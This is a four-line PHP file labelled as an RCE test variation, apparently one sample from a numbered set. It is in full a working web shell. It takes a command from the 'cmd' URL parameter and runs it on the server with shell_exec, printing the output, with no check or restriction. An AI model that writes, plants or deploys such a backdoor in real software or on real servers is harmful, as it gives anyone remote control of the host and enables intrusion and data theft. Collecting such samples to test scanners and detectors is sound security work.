<?php
// RCE test variation #1277
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>